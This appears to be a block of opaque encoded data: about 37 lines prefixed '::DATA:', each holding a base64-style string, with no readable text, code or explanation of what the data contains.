::DATA:SLGopxCt8AJXLVR9OYr5OlvfAKDnQp5tGb+R+dxIXqRTCXZGMcpNDg3VpbW/upiXZYwB6hdwo+E+nFfOlauuHFGlY4gU1yFzC4R8ejyAkeU2BfGg06wwtsPD
::DATA:53IcpwfN0I+JcrVe7M9SoF0IYQZSdWFvWMusVKQqGJslq2nGYJZNpEbH9qW44GT05Dp3V3FKCps9p/l/dejU0FV8FRDslKdvikC8maeObP2Sp3FcpCP70GoC
::DATA:g8yapdlLCFtBZlBDD484yOt5ompJH09StWC99La1l+McxNNz8o8jxplSPwzqN6v16ODj2PGPqOnFDgXucU6hrjmlIiFHOoOJWA9afyDeWjcLYbNCJH4h8Wid
::DATA:3G17S4xOEYEYyhLKPqIIP3UKSQeAINtOEn5nbCyAv40Unw1ctvqUcHTl1Nnuj0oULe880GYi7JP9736bcoVYhfVhFLPCHNW/RxPl5zVn+HAcIMg/BSNyzeBd
::DATA:HZJ1vingEhB5g+xMlQWucxVP8Gh2W8wCnHzoAGntP8Ja23Ot/HwrkJEz3Wv5DWZvDLlN3AdP7Py20L2JiZy62b6NUMa/Nr1Kbrnyvmvzuz9eb4HqsgYPSjaK
::DATA:EY5Q5MTtGJwUz0O2GEEuV5SXHj6fBPhT1iGN8a4ZM3MjiI1FDQ9bgMA73VJ4y6uDfoXV6KTxfaZLTwpAPmaUgGFonnevyRbXBpQHaiv63oYm/AtTXbN+Yfyc
::DATA:9VOemTVp1Cw7gUaak7abxn2b8oS4Ibn3URmu8OF4wbuuvDxaJdn5QKYkxxyMMV/giKIuyVzfouiaQWIPKN9aiROrNO2q2vOGmcbDhjewYrb/6Ja5Yuzbxv9s
::DATA:8vEzdayhyQ7LjbiBTG/YJBdcTO9gr0d0oId7/PW+llNVPGNsfev+z93qS+k72UZo8DpRAZ33S2kCY0gZZm/DgetLAGmeXwxn7Ms21sOHmORgezrzqj6yRi6k
::DATA:Lkv6YvhsjwVkOh5LZBhKvahJBC9Fwjpuk4OXpWfV6fsVxhkK6s0NJqzHl3nWFMchhs8n9ZBlHiNUcgOngYX2aBh0lxkkZq4IADwJNSwu9nSaX9m3JvpJw7kT
::DATA:OV/NKiP5lDuQXpyg9Je95dH/0cxGnAh7k2DdPztqaDx82XzPOcvpsECVOrKu/BE7GkMJ8xGexWs7Q0q3KYYW/zbO6CmMUwzPGgazSb4VFHNXmAQGvMTrGM/+
::DATA:J4A62MX9KKBCmzUpSqWq+HlltAyQDPwlDhUVP7YfJLsaudzjxidij+Utwh//aFjEkQ8qWiE1Nyb+G7Ju+B8lnqg5rHTqJ5l0Qi1eiP8ekMADcDeVYYPxEBtI
::DATA:+AsPnRzM4mtT3ZGe56NfjE4Jph/MLo9q3p4YYXPXoY7RW2EJNz06SEv4M5zUoTNvgW/0vkkKEEShZh0AS5Q3PBjJcAE+IYHWSpWZSe90saFxgXLNmDr+YIQK
::DATA:OdRZhwsmzrcYFS+HyJX8H+kB1Z5GkQufs9VO1wCyXYAY+qZTKaCvRDC9/9UJFxQ8xeXpTTOUGWY+vItptr0aQr7PkHeri/KOHhcpY6yCFgtVjrcKpXU57k2B
::DATA:CT1WV0lGOgnthkvlus3dV1yaD13zIhd0/6gbM8E0V4LQwKRIv9RTnCXQIN6yQGV0D7zNwi72QOZ7zNajB7YXYBGkItqXEA5C+Qry7fdc5e5xcfOKvH19xOb/
::DATA:chXL+BSV5D/QJuN5JODHr+H8ObTkDwuSxAEH5mSswJ0b4T2dUUs27SgNXUJSlom+vZCyxE2GxdEgYBUaQouhw0T95lv0SMlwxRsthtxWUJ1I9s2AUm6FIqLy
::DATA:Ts4ULSOJF55aPbXjdMRw5q9gENREOYRVmRBBktGEYfGiRP8ZkuaLoBTPH+XFgJQLkx63fHUU0zGLkUnA0GurnEIZajoTKJ8V7/3BWON3vrAHG+WMoFR2LXkq
::DATA:/PTceTjvHbJCdaMGkNksUzF5hzNXvohOMhUQe3FbI6E9vnHzjWVTrpa4Vk+N+VfPDhgKPpnRitrmJOWUdJ9XJzrKXw/96TdqoLXxV7/0u8ThaZtL0b1jh68X
::DATA:XXizydqqkeICAiofenMUq8lFWqAp0bbQP5Q5RxzLCKPXLWdAct65CHck/jDZtNzw6X63yOXSGn/HCPsWljT1aBuN06GtrTnlpvjDGcr2di5lN0lT9y0ArHTN
::DATA:y8zmyq34M/8uUaY7pLNFaW41xI/86zkYaY6629Sx75/Yz3xmDLv6L+CWUkMfiFy0HUkhy3Rjw5d1NHhglEzgJHWyK3P2NNQEUiM638LK/WB38uC38PCKUPML
::DATA:TUDvXpZD1tgsrRMIO0W+VCsg1f6I6uWxBQV3+7w1FbsHqn6duvYjVAeUJGcdsvQU8iwCDOPg9Kx8VcTJYygAFr8zLtWsZvaQc5CDI9beXe+g4NN2FnRyIjR8
::DATA:1Y+EhfrVxtyP6Kxu3N8O9pAc/dXmYaEcj7+vYcoEJMWFtadhtrom9VBoVAmFtXFaM9R0F1h44+2pA4qGFOt5y2UQbH7rhAI2XBEOqCCn1GLE//LPxzBvOZFC
::DATA:09faIOsu39KXKER6gyvWkdMG1zalAN8NjIdUsca8EdPZpY4Guw4wbsfapsChsOBWi1aGon5DbgmHH7PqPUa3l9KiuCaXI6id6jpjx5ZD0b1yPnaDuHx2ArI/
::DATA:1bZg0ae0klbMbkxZbvoi1UqvjaQkqzYS3T4KJy64IAHS5yVqL9niUpSfs2eLOPrrukKZTRbIoCgztn43OyCqL73G0HqhjqDncavy+Jkw7GIckYPYOEpfMewm
::DATA:+nt79C2iUq+DuMO2sQLmDDXEjU//W+SDG6OWIs2m3bIwt8ExXQnHpqyL2hrvDmNDumGc4YctZMb3JCCYhbtuX4EB3/nXFoQfHGQ5/GnsAK9OJWW7ySJSxBlo
::DATA:XgbvIhFC3Mdd89Khmrr40CBBo2WXjS+l7T0Es8zaxxvbPj4JGSSC8FvGmCZyGPOgD2OuzmPLSOtMtKfKWJJBZcbGcCUlCVW/b3VURCsYue01RLlfye/N3SjN
::DATA:8EjXgrs04uZlKah/SGN2hgivkI6lIhdLsyHlJOiB5FjmShdttyFGVSXPKTY4vghu2tiqY38DClwXR7ro9w6uEyUOJeUHz+QEChT/ce7dcdMGyuUk3bYWK0cw
::DATA:LVv++gWlehEhSFW54vcm4h/QUEhzhfSX3P8hpyGHUdpsgGmNNBIPQ+KP7uAjvytPi4qavTnkhqzAjJTe62Sbl7Jn8knf3JxuQxDjoj3NpQ+2vJcteB9eV2/O
::DATA:HrBYhqMQYqJEVf+LK7mhcc8VxymNvEkmqe8KLzq/vdqjld049CsscbJVwWofZiQz7KamAtJefb+UTbkE2rO8f0wSJgZkkqf5pE/yVx6NbvcbEiBh5vqRBty2
::DATA:xAGNqgtJRPLyd5qQigByF1flB/mxo4ixc0uKaNb7uJSDVS6HLxLQ9XIK2IdevgQIzPF8dVQhOh83jiy5IoR7yhBszlM/XoqXoggE+szC5sPyoazjKOh2BAED
::DATA:JPo1tBjklDeFgeZQ5n4nzrwQrvNpQCe2s4zrC+nCYBP+HStgjHliS1m9mM8thyBdd2yOb3fT5HU9V4oHI7olfqGIYxCjgIVK+9kVEihjhnS+ZSlgrXwFQUas
::DATA:SOt1fQg/fC8Mnc8TiW1rnqZqS5CXFBo6YLhAtx2nmQTn01ZWU278n3B3l+mBeluz6WSJo1joPnBUCcFIz8rlOmx/yGnbdmN6Nx/MZym5q5oIGJ6ELH5u8y8K
::DATA:8+FkVCMNOPkuZoK6fTejsNLzINm+mjbrF7Gwz+ogsM98fflufcplAI1dVII69hnRZseZWAyjkg9DgI1rnk6pF3XRek88cfIf/4eQE0b9Wrv69U076ilXkjhz
::DATA:UZ3Na9ugEWLApE8419f8i2usQ9qoNH3Itt1CmChna4eq3fnvMHA7S6FVK3KXbiV4UhCouS0Ii7MehHl3P+sX7XnQ/XBs4v19USAyo2nRHH9gU/xfya8Op1Af
::DATA:EyauOBC8oftav10Grcc7dURka5Id3DT+xZDZfhbHACs1wwoN7W1AQ+j7K9eplOkwNpqlpRrU9kdzXThfP/NtFgBOrZsgBjKSy0N6UITPICsXRKii7Hx9lgCE
::DATA:sjjemSsZZBPY5y4VpT+2RWlsl6g/5PIA5OV1zdhjos+0Qhpze8WGrv8I8/U0VfweIoaKOTDG82SpAqk7KGZWH4b1RVAihN3oop7kHUB09m1RxkJWKlIic6x4
::DATA:m9ayAJZr1ilVDpnfm3C8DnUt6N9vI7SwyoG6fHl8xkls0EhQYZs+L/iF0rJmnQ1YeP6zHlNDiY+QM6K2LEtYXqKQvjqL6Q5MEeFMYnt9EkVQhPNz01cn6W+3
::DATA:+7E+qQR9nthz1byMP7RBmV2483xUZDsrygi+BkLG8ohkVKCYvis=
